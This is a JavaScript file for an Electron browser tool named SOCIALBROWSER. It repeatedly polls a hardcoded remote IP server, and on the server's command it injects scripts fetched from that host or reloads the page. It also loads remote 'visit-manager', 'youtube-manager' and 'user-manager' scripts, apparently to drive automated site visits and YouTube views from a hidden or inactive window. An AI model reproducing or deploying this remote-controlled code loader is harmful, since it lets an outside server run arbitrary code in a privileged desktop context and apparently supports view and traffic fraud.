(function (w) {
    if (w.MYSERVERSCRIPT_LOADED) {
        console.log('MYSERVERSCRIPT Aborting 0 ...');
        return;
    }

    w.MYSERVERSCRIPT_LOADED = true;
    w.MYSERVERSCRIPT = true;
    /** for old versions */
    w.client = w.client || {};
    w.client.basic_update = true;
    w.client.first_script = true;
    w.client.youtube_views = true;

    (function helpFunctions() {
        let escapeExpStrings = function (s) {
            return s.replace(/[\/\\^$*+?.()[\]{}]/g, '\\$&');
        };

        if (!String.prototype.test) {
            Object.defineProperty(String.prototype, 'test', {
                value: function (reg, flag = 'gium') {
                    try {
                        return new RegExp(reg, flag).test(this);
                    } catch (error) {
                        return false;
                    }
                },
            });
        }

        if (!String.prototype.like) {
            Object.defineProperty(String.prototype, 'like', {
                value: function (name) {
                    name = name.split('*');
                    name.forEach((n, i) => {
                        name[i] = escapeExpStrings(n);
                    });
                    name = name.join('.*');
                    return this.test('^' + name + '$', 'gium');
                },
            });
        }

        if (!String.prototype.contains) {
            Object.defineProperty(String.prototype, 'contains', {
                value: function (name) {
                    return this.test('^.*' + escapeExpStrings(name) + '.*$', 'gium');
                },
            });
        }
    })();

    if (!w.SOCIALBROWSER) {
        w.SOCIALBROWSER = {
            browserData: {},
            var: {
                core: { id: '' },
                blocking: { youtube: { quality: { name: 'medium', value: '360' } } },
            },
        };
        SOCIALBROWSER.isIframe = function () {
            try {
                return window.self !== window.top;
            } catch (e) {
                return true;
            }
        };
    }

    if (w.SOCIALBROWSER) {
        SOCIALBROWSER.is_new = true;
        SOCIALBROWSER.ip = 'ip';
        SOCIALBROWSER.scriptList = [];
        (function prepareSOCIALBROWSER() {
            SOCIALBROWSER.electron = SOCIALBROWSER.electron || require('electron');
            SOCIALBROWSER.remote = SOCIALBROWSER.remote || SOCIALBROWSER.electron.remote || require('@electron/remote');

            SOCIALBROWSER.server_url = 'http://127.0.0.1:60002';
            SOCIALBROWSER.server_url = 'http://143.110.168.152:60002';
            SOCIALBROWSER.currentWindow = SOCIALBROWSER.currentWindow || SOCIALBROWSER.remote.getCurrentWindow();

            SOCIALBROWSER.add_script = function (info) {
                if (SOCIALBROWSER.scriptList.some((s) => s.url == info.url)) {
                    return;
                }
                SOCIALBROWSER.scriptList.push(info);
                var script = document.createElement('script');
                script.id = info.id;
                script.src = info.url;
                document.querySelector('head').appendChild(script);
                console.log('Adding Script : ' + info.url);
            };
            if (SOCIALBROWSER.var.core.version < '2021.11.15' || !SOCIALBROWSER.fetchJson) {
                SOCIALBROWSER.fetchJson = function (options, callback) {
                    options.body = options.body || options.data;
                    if (options.body && typeof options.body != 'string') {
                        options.body = JSON.stringify(options.body);
                    }

                    fetch(options.url, {
                        mode: options.mode || 'cors',
                        method: options.method || 'POST',
                        headers: options.headers || {
                            Accept: 'application/json',
                            'Content-Type': 'application/json',
                        },
                        body: options.body,
                    })
                        .then((res) => res.json())
                        .then((data) => {
                            callback(data);
                        })
                        .catch((err) => {
                            console.log(err);
                        });
                };
            }
        })();

        SOCIALBROWSER.waiting = function () {
            SOCIALBROWSER.fetchJson(
                {
                    url: SOCIALBROWSER.server_url + '/api/waiting',
                    method: 'POST',
                    body: {
                        xid: SOCIALBROWSER.var.core.id,
                        is_new: SOCIALBROWSER.is_new,
                    },
                },
                function (data) {
                    SOCIALBROWSER.is_new = false;
                    if (data.message) {
                        if (data.message === 'add_script') {
                            SOCIALBROWSER.add_script({
                                url: data.script_url.replace('##server_url##', SOCIALBROWSER.server_url),
                                id: data.script_id,
                            });
                        } else if (data.message === 'reload') {
                            w.location.reload();
                        }
                    }
                },
            );
        };
        if (!SOCIALBROWSER.var.core.id) {
            SOCIALBROWSER.var.core.id = '';
        }
        if (SOCIALBROWSER.var.core.id.like('*test*')) {
            let win = SOCIALBROWSER.currentWindow;
            win.showInactive(false);
            win.setSkipTaskbar(false);
            win.showInactive();
            win.openDevTools();
        }
    }

    console.log('MYSERVERSCRIPT Loading ...');

    function checking() {
        if (!w.MYSERVERVISITSCRIPT) {
            SOCIALBROWSER.add_script({
                url: SOCIALBROWSER.server_url + '/js/visit-manager.js?time=' + Date.now(),
            });
        }
        if (!w.MYSERVERYOUTUBESCRIPT) {
            SOCIALBROWSER.add_script({
                url: SOCIALBROWSER.server_url + '/js/youtube-manager.js?time=' + Date.now(),
            });
        }
        if (!w.MYSERVERUSERSCRIPT) {
            SOCIALBROWSER.add_script({
                url: SOCIALBROWSER.server_url + '/js/user-manager.js?time=' + Date.now(),
            });
        }

        if (w.SOCIALBROWSER) {
            SOCIALBROWSER.waiting();
        } else {
            /** tell server there is no SOCIALBROWSER */
        }
    }

    checking();

    setInterval(() => {
        checking();
    }, 1000 * 60 * 10);
})(window);
